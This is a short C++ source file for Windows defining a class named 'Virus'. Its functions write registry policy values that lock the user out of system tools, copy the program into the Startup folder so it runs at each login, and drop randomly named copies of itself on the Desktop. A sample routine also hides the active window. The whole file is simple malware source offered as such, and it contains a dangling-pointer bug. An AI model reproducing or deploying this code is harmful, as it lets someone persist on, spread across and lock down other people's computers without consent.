#include <windows.h>
#include <Shlobj.h>
#include <time.h>
#include "Examples.h"

class Virus
{
public:
	char* GetProgramLocation()
	{
		char szpath[MAX_PATH];
		GetModuleFileName(NULL, szpath, MAX_PATH);
		return szpath;
	}
	void DisableAccess(const char* application)
	{
		HKEY hkey;
		DWORD value = 1;
		RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
		RegSetValueEx(hkey, application, NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
		RegCloseKey(hkey);
	}
	bool AutoStartup(char* SrcFilePath, char* DestFileName)
	{
		char szStartupPath[MAX_PATH] = { 0 }, szDestFilePath[MAX_PATH] = { 0 };
		SHGetSpecialFolderPath(NULL, szStartupPath, CSIDL_STARTUP, true);
		wsprintf(szDestFilePath, "%s\\%s", szStartupPath, DestFileName);
		return CopyFile(SrcFilePath, szDestFilePath, false);
	}
	void ReproduceVirus()
	{
		std::string rd_name = Main::random_string(4, true, false);
		char Desktop[MAX_PATH], target[100] = {};
		SHGetSpecialFolderPath(NULL, Desktop, CSIDL_DESKTOP, false);
		wsprintf(target, "%s%s%s%s", Desktop, "\\", rd_name.c_str(), ".exe");
		CopyFile(GetProgramLocation(), target, false);
	}
	void HideProgramExe()
	{
		HWND hwnd = GetForegroundWindow();
		if (hwnd) ShowWindow(hwnd, SW_HIDE);
	}
};

void SampleVirus()
{
	Virus virus;
	virus.HideProgramExe();
	system("start chrome");

}
